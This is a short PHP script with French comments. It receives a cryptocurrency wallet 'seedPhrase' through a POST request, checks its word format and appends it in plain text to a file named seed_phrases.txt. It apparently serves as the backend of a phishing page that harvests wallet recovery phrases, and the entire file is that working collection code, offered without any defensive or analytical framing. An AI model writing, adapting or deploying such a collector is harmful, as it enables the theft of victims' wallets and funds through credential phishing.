<?php
// Vérifiez que la méthode est bien POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Vérifiez si la seed phrase a été envoyée
    if (isset($_POST['seedPhrase'])) {
        // Récupérez la seed phrase
        $seedPhrase = $_POST['seedPhrase'];

        // Validez ou traitez la seed phrase si nécessaire
        // Par exemple, vous pouvez vérifier si elle contient des mots séparés par des espaces
        if (preg_match('/^(\w+\s+)+\w+$/', $seedPhrase)) {
            // Sauvegarde dans un fichier
            $file = 'seed_phrases.txt';
            $current = file_get_contents($file); // Lire le contenu existant du fichier
            $current .= $seedPhrase . "\n"; // Ajouter la nouvelle seed phrase
            file_put_contents($file, $current); // Sauvegarder dans le fichier

            echo json_encode(['status' => 'success', 'message' => 'Seed phrase saved successfully']);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Invalid seed phrase format']);
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'No seed phrase received']);
    }
} else {
    echo json_encode(['status' => 'error', 'message' => 'Invalid request method']);
}
?>
